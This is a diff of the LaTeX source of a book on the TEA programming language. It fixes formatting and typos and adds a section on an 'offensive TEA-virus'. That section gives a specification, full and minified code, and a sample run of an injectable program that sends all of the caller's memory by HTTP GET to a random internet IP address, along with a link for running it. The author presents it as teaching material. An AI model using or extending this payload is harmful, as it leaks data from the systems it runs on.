@@ -270,7 +270,7 @@ moredelim=[s][\color{myorange}]{\{}{\}},
   \centering
   \LARGE
 	\begin{tabular}[t]{|p{0.8\textwidth}}
-I:\{\textbf{Dedicate this book to Dr. Marriette of Makerere University, CoCIS graduate school.} When she first taught me LISP on the white-board, during my masters class on advanced computer programming --- \textbf{MCN7105}:``Structure and Interpretation of Computer Programs", I felt like a special mini-universe of computing had been hidden from me all along. \textit{Exposure to not just a different, albeit uncommon syntax and abstraction approach to computational problem solving she passed down to me, and somewhat helped spur my interest further, into exploring non-mainstream programming languages, and recalling when I first encountered a serious non-C-family language, RUBY by Matz, first exposed to me by Revence Kalibwani (R*I*P), I never looked back, and now I have a truly elegant and yet fully functional non-C-family computer programming language of my own, several years down the road.}\}
+I:\{\textbf{Dedicate this book to Dr. Marriette of Makerere University, CoCIS graduate school.} When she first taught me LISP on the white-board, during my masters class on advanced computer programming --- \textbf{MCN7105}:``Structure and Interpretation of Computer Programs", I felt like a special mini-universe of computing had been hidden from me all along. \textit{Exposure to not just a different, albeit uncommon syntax and abstraction approach to computational problem solving she passed down to me, and somewhat helped spur my interest further, into exploring non-mainstream programming languages. Also, I recall when I first encountered a serious non-C-family language, RUBY by Matz, first exposed to me by Revence Kalibwani (R*I*P), I never looked back, and now I have a truly elegant, fully functional non-C-family computer programming language of my own, several years down the road.}\}
 \begin{verbatim}
 |U:|A:|V:C|A*:C 
 \end{verbatim}
@@ -2563,12 +2563,13 @@ The simplest TEA program one might write is the so-called \texttt{HELLO WORLD} p
 
 \begin{figure}[H]
  \Large
-  \centering
   \begin{tcolorbox}[teaterminalstyle, title=A Basic TEA Hello World Program]
   \begin{lstlisting}[language=TEA]
 i!:{Hello World}
    \end{lstlisting}
   \end{tcolorbox}
+  \caption{A Basic TEA Hello World Program}
+  \label{EXTEAHW}
 \end{figure}
 
 
@@ -2588,7 +2589,6 @@ Such a program could be something like this...
 
  \begin{figure}[H]
  \Large
-  \centering
   \begin{tcolorbox}[teaterminalstyle, title=TEA Program: SELF-MODIFYING HELLO WORLD]
   \begin{lstlisting}[language=TEA]
 i!:{Hello World} | v:vIN
@@ -2606,7 +2606,7 @@ v:vCMD #store the program we generated
 
 y:vIN #load original input
 e*:vCMD #execute it against generated program
-v:vOUT #store the ouput
+v:vOUT #store the output
 
 #then present the session results..
 v:I:{Input was:} | v:C:{Auto-Generated Program Was:} 
@@ -2621,11 +2621,9 @@ r!:_:{
 \end{figure}
 
 
-Upon running that code, anywhere TEA can work, we shall get results such as the the following...
+Upon running that code, anywhere TEA can work, we shall get results such as the following...
 
 
-\begin{figure}[H]
-  \centering
   %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
   \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
 Input was:
@@ -2639,19 +2637,18 @@ p!:
 
 
 Output Was:
-hoymadebppfznmajnwmprwra ymtlhuxwkehmcmpdqnhaos trfmgkakypbv
+hoymadebppfznmajnwmprwra ymtlhuxwkehmcmpdqnhaos trfmgkakypbv  
   \end{tcbverbatim}
   %\caption{The TEA Instruction Lexical Specification (regular language)}
   %\label{FIG1}
-\end{figure}
+
 
 
 And another example... also an interactive one:
 
 
-\begin{figure}[H]
-  \centering
-  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
+
+
   \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
 Input was:
 Hello World
@@ -2664,18 +2661,19 @@ i:
 
 
 Output Was:
-hi there
+hi there 
   \end{tcbverbatim}
   %\caption{The TEA Instruction Lexical Specification (regular language)}
   %\label{FIG1}
-\end{figure}
+
 
 This last one interestingly generated a program that prompted the user for some input at runtime, and so, the output of the main program is based on that input instead of the original explicit input!
 
-And then one final example output to show just how interesting this little program might be...
+\vspace{1em}
 
-\begin{figure}[H]
-  \centering
+And then one final example output to show just how interesting this little self-modifying program might be...
+
+
   \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
 Input was:
 Hello World
@@ -2702,7 +2700,220 @@ H
   \end{tcbverbatim}
   %\caption{The TEA Instruction Lexical Specification (regular language)}
   %\label{FIG1}
+
+
+
+\subsection{EXAMPLE 2: OFFENSIVE TEA-VIRUS PROGRAM MODIFYING and EXPOSING A CALLER PROGRAM via WEB}
+\label{SECEXAMP2E}
+
+
+First, let us try to build rapport for this next example, by first picturing what could go wrong when we have the power to write programs that can modifying themselves or which can modify other programs... We shall use some still-comics originally shared on the \textbf{UIC}\footnote{\textbf{UIC}: core Uganda Internet Community: \url{https://t.me/ugandanow}} which also happens to be the first Internet Community where both the Tech-inspired web-comic \#icecomics is typically posted, but also where much of the progress on the TEA language is shared with a close-knit circle of potential users and friends. In these pictures, we see the \#icecomic character, Ruby, chatting with her friend about a potentially malicious TEA program she came across...
+
+\begin{figure}[H]
+  \centering
+  \begin{subfigure}[b]{0.45\textwidth}
+    \includegraphics[width=\textwidth]{resources/images/self_mod1.jpg}
+    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
+    %\label{FIGNSIGIL}
+  \end{subfigure}
+  \hfill
+  \begin{subfigure}[b]{0.45\textwidth}
+    \includegraphics[width=\textwidth]{resources/images/self_mod2.jpg}
+    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
+    %\label{FIGNSIGIL2}
+  \end{subfigure}
+  \caption{\textbf{ICecomics} Ruby Complains about Self-Modifying TEA Program}
+  \label{FIGSELFMODDEMO}
 \end{figure}
+
+
+ \begin{figure}[H]
+  \centering
+  \begin{subfigure}[b]{0.45\textwidth}
+    \includegraphics[width=\textwidth]{resources/images/self_mod3.jpg}
+    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
+    %\label{FIGNSIGIL}
+  \end{subfigure}
+  \hfill
+  \begin{subfigure}[b]{0.45\textwidth}
+    \includegraphics[width=\textwidth]{resources/images/hacker.jpg}
+    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
+    %\label{FIGNSIGIL2}
+  \end{subfigure}
+  \caption{Hacking and Info-Sec Action Leveraging TEA Programming}
+  \label{FIGSELFMODDEMO2}
+\end{figure}
+
+
+
+This example is shared here, for especially education/research purposes and is not meant to be actually used in real-life because... well, it could be dangerous!
+
+\vspace{1em}
+
+Essentially, we have crafted a special virus-like TEA program that can be injected into other TEA programs, and which injected program then, compromises the security of the caller/main program because it siphons off all the data the caller program had in memory, and then posts it to some address on the Internet. For purposes of demonstrating how convoluted such programs might be, we do not post to a specific IP address on the network, but instead let the program auto-generate its own destination address, and so, in a way, it also demonstrates how a hacker might craft a program that steals or shares secrets with destination computers that are otherwise hard to pin-down or which span a very large address-space so that determining to whom the data is being sent is actually hard.
+
+\vspace{1em}
+
+For purposes of helping students and other researchers understand this program, the original specification for the example is as such:
+
+
+\begin{center}
+\fbox{\begin{minipage}{0.9\textwidth}
+\LARGE
+\textbf{Specification of A Self-modifying TEA Virus Program:}\\
+
+Compose an injectable TEA program that does the following:
+
+\begin{enumerate}
+
+\item Generates a random number and stores it in a vault named id
+
+\item Generates a random alpha-message and stores it in a vault named data.
+
+\item Generates a random IP address
+
+\item Creates a TEA program that can make an HTTP GET request to that random IP address, sending everything in the vaults/memory to that random IP address as part of URL query data (including whatever is in the main program vaults)
+
+\item It then prints whatever was returned from the remote server if not empty otherwise returns an error message indicating the randomly generated id, data and random IP address that couldn't respond as the sub-program output.
+
+\item Make the above functionality all reside inside a single Stored Program in a vault named vCMD
+
+\item Inject that program into the caller/main program using E*!:vCMD that shall also immediately execute it.
+
+\item The main program shall become modified from that point on-wards, so that it executes the injected code, posts its memory details to the remote address and at the end of the injected program, has the AI holding the self-diagnosis message from the injected program or a message from the remote contacted server/Network end-point.
+
+\item For education purposes, let the injected program merely print whatever is the AI after the injected program is executed and make the caller program quit unconditionally.
+\end{enumerate}
+
+\end{minipage}}
+\\
+\end{center}
+
+
+Such a program could be something like this...
+
+
+ \begin{figure}[H]
+ \Large
+  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
+  \begin{lstlisting}[language=TEA]
+#store original input in main program
+i:{Hello World} | v:vIN 
+
+#the evil program stored in a string...
+v:vCMD:"
+n!:1000 | v:id #random id
+p!:10 | v:data #random data
+n!:256:0:4:. | v:ip #random ip address
+v:vPROTOCOL:{http://}
+x*:vPROTOCOL | v:url #target web endpoint
+w*: #make HTTP GET with all vaults!
+v:vOUT #store output/results
+"
+
+#now inject/execute that stored-virus-program 
+#in main program
+E*!:vCMD #modifies main program
+
+#store any resulting output
+v:vOUT
+
+#in case we got any output post-self-modification, 
+#print it and quit
+#q:^$
+
+#otherwise present the session results..
+v:I:{Original Input was:}|v:C:{Injected Program Was:} 
+| v:O:{Output Was:} | v:S:_
+g*:_:I:vIN:S:C:vCMD:S:O:vOUT
+r!:_:{
+}
+   \end{lstlisting}
+  \end{tcolorbox}
+    \captionof{figure}{TEA EXAMPLE: An Injectable TEA VIRUS Program Demonstrating SELF-MODIFYING Capabilities and Info-SEC Offensive Action}
+  \label{FIGE1}
+\end{figure}
+
+
+Upon running that code, anywhere TEA can work, we shall get results such as the following...
+
+
+  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
+  \begin{tcbverbatim}[title=Sample Session of Injectable WEB-accessing TEA VIRUS]
+Original Input was:
+Hello World
+
+
+Injected Program Was:
+
+n!:1000 | v:id #random id
+p!:10 | v:data #random data
+n!:256:0:4:. | v:ip #random ip address
+v:vPROTOCOL:{http://}
+x*:vPROTOCOL | v:url #target web endpoint
+w*: #make HTTP GET with all vaults!
+v:vOUT #store output/results
+
+
+
+Output Was:
+[ERROR]: NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'http://50.183.200.135/?vIN=Hello+World&vCMD=%0An%21%3A1000+%7C+v%3Aid+%23random+id%0Ap%21%3A10+%7C+v%3Adata+%23random+data%0An%21%3A256%3A0%3A4%3A.+%7C+v%3Aip+%23random+ip+address%0Av%3AvPROTOCOL%3A%7Bhttp%3A%2F%2F%7D%0Ax*%3AvPROTOCOL+%7C+v%3Aurl+%23target+web+endpoint%0Aw*%3A+%23make+HTTP+GET+with+all+vaults%21%0Av%3AvOUT+%23store+output%2Fresults%0A&id=642&data=vgisdhgmya&ip=50.183.200.135&vPROTOCOL=http%3A%2F%2F&url=http%3A%2F%2F50.183.200.135'. 
+  \end{tcbverbatim}
+  %\caption{The TEA Instruction Lexical Specification (regular language)}
+  %\label{FIG1}
+
+
+Note that the program is definitely attempting to make an HTTP GET request to a random address on the Internet. This might work or not --- for example, there is no guarantee that the target IP address actually exists nor that the server or network endpoint being contacted will accept the request, process it nor send back and useful message/result. However, the program does indeed make a network call, and data is actually posted off the calling system to some resource on the network. This alone could cause data-leaks or unknown side-effects over the network. However, despite that happens, the program has been written in such a way that we can at least easily DEBUG what actually was done --- we get to see what data the TEA-virus attempted to send to the remote server, we also see what IP address it was trying to contact, and then what result or error ensued from that call.
+
+\vspace{1em}
+
+For those interested in pursuing this line of research --- for example, students exploring domains like network-security, information-security, penetration-testing, hacking, virus-programming etc, it shall perhaps help offer some insights into what actual professional hackers might do when given the right kind of tools or languages.
+
+\vspace{1em}
+
+Also, for purposes of appreciating and testing this code out in real-life, one might load it into the WEB TEA IDE and try either modifying it further\footnote{Note that the TEA WEB IDE not only allows one to unminify a program, but also validate and/or sanitize it to ensure that it conforms to the right syntax and that it can readily be shared without extraneous comments, etc.} or build upon it to craft more serious payloads/programs. The minified version of the program can be loaded for testing via the call:
+
+
+\vspace{1em}
+
+ \url{https://tea.nuchwezi.com/?fc=https://gist.githubusercontent.com/mcnemesis/143ea8c1d49aee8e7758f5c414125382/raw/tea_virus_example_selfmod_min.tea}
+
+\vspace{1em}
+
+
+
+And for those interested, the minified+sanitized version of this program is as such:
+
+
+
+ \begin{figure}[H]
+ \Large
+  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
+  \begin{lstlisting}[language=TEA]
+i:{Hello World}
+v:vIN
+v:vCMD:"n!:1000|v:id|p!:10|v:data|n!:256:0:4:.|v:ip|
+v:vPROTOCOL:{http://}|x*:vPROTOCOL|v:url|w*:|v:vOUT"
+E*!:vCMD
+v:vOUT
+v:I:{Original Input was:}
+v:C:{Injected Program Was:}
+v:O:{Output Was:}
+v:S:_
+g*:_:I:vIN:S:C:vCMD:S:O:vOUT
+r!:_:{
+}
+   \end{lstlisting}
+  \end{tcolorbox}
+    \captionof{figure}{TEA EXAMPLE: The Injectable TEA VIRUS Program Minified and Sanitized}
+  \label{FIGE2}
+\end{figure}
+
+
+
+
+
+
 
 
 %%%%%%%%%%%---------[ CONCLUSION ]--------%%%%%%%%%%%%%%%%%
